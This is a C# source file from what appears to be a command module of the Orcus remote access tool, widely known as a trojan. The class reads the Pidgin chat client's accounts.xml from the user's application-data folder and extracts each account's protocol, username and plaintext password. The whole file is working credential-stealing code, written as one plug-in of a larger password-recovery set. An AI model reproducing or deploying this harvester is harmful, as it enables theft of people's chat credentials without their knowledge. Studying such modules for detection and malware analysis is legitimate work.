using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Pidgin
{
    internal class Pidgin : IPasswordRecovery
    {
        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            var accountsPath =
                new FileInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    @".purple\accounts.xml"));
            if (accountsPath.Exists)
            {
                var reader = new XmlTextReader(accountsPath.FullName);
                var objXmlDocument = new XmlDocument();
                objXmlDocument.Load(reader);

                if (objXmlDocument.DocumentElement != null)
                {
                    foreach (XmlNode objXmlNode in objXmlDocument.DocumentElement.ChildNodes)
                    {
                        var innerList = objXmlNode.ChildNodes;

                        RecoveredPassword password;
                        try
                        {
                            password = new RecoveredPassword
                            {
                                Application = "Pidgin",
                                UserName = innerList[1].InnerText,
                                Password = innerList[2].InnerText,
                                Field1 = innerList[0].InnerText,
                                PasswordType = PasswordType.Chat
                            };
                        }
                        catch (Exception)
                        {
                            continue;
                        }
                        yield return password;
                    }
                }

                reader.Close();
            }
        }
    }
}